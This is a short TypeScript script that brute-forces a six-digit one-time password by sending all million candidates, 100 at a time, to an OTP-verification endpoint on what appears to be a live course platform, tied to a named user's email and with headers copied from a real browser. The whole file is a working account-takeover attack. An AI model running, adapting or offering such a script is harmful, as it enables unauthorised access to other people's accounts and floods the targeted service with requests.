import axios from "axios";

async function sendRequest(otp: number) {

let config = {
  method: 'get',
  maxBodyLength: Infinity,
  url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp='+otp,
  headers: { 
    'accept': '*/*', 
    'accept-language': 'en-IN,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-XA;q=0.6,en-GB;q=0.5,en-US;q=0.4', 
    'auth-key': 'appxapi', 
    'client-service': 'Appx', 
    'device-type': '', 
    'origin': 'https://100xdevs.com', 
    'priority': 'u=1, i', 
    'referer': 'https://100xdevs.com/', 
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"', 
    'sec-ch-ua-mobile': '?0', 
    'sec-ch-ua-platform': '"Windows"', 
    'sec-fetch-dest': 'empty', 
    'sec-fetch-mode': 'cors', 
    'sec-fetch-site': 'cross-site', 
    'source': 'website', 
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
  }
};

try {
  await axios.request(config)
  console.log("done for " + otp);
} catch(e) {
  
}

}

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()